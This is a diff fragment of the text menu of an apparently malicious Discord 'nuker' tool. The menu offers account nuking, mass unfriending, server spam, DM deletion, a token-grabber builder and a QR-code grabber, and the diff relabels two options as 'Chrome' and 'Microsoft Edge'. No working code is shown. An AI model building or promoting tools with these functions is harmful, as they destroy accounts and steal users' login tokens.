@@ -647,8 +647,8 @@ def bannerTheme(type1, type2):
 > Created by Rdimo#6969             ██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝            ;`'.,_\  `-'-'  /_,.'`;
 > https://Cheataway.com             ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝              '-._  _.-'^'-._  _.-' ''')+type2('''  
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-[1] Nuke Account                                |[10] Block Friends
-[2] Unfriend all friends                        |[11] Profile Changer
+[1] Chrome                                      |[10] Block Friends
+[2] Microsoft Edge                              |[11] Profile Changer
 [3] Delete and leave all servers                |[12] [Coming Soon]
 [4] Spam Create New servers                     |[13] Create Token Grabber 
 [5] Dm Deleter                                  |[14] QR Code grabber
